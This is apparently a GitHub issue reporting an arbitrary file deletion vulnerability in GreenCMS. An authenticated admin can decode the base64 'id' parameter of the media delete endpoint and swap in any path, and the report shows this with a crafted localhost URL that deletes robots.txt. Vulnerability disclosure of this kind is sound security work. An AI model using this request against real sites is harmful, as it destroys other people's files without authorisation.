## Description

[![@lovejackey](https://avatars.githubusercontent.com/u/26524563?v=4&size=48)](/lovejackey)[lovejackey](https://github.com/lovejackey)opened [on Nov 17, 2018](https://github.com/GreenCMS/GreenCMS/issues/113#issue-381834556)

After the administrator logged in, open the following link

**<http://localhost/index.php?m=admin&c=media&a=restorefile>**

Click the delete button，we can get a link like this

<http://localhost/index.php?m=admin&c=media&a=delfilehandle&id=QzpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXL0RhdGEvQmFja3VwXzk3NzJhZWZiODMvL3N5c3RlbV9iYWNrdXAtMjAxODExMTctNDk5OTc5MWY3NGViMTAxZDllNzJhMjllODU3OTBkYWIuemlw>

the string **QzpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXL0RhdGEvQmFja3VwXzk3NzJhZWZiODMvL3N5c3RlbV9iYWNrdXAtMjAxODExMTctNDk5OTc5MWY3NGViMTAxZDllNzJhMjllODU3OTBkYWIuemlw** is encoded by base64,so we can decode it ，the decoded string is **C:\phpStudy\PHPTutorial\WWW/Data/Backup\_9772aefb83//system\_backup-20181117-4999791f74eb101d9e72a29e85790dab.zip**

so we can encode the string like this **C:/phpStudy/PHPTutorial/WWW/robots.txt** and structure the link **<http://localhost/index.php?m=admin&c=media&a=delfilehandle&id=QzovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3JvYm90cy50eHQ=>**, when we visit this link,the robots.txt file is deleted
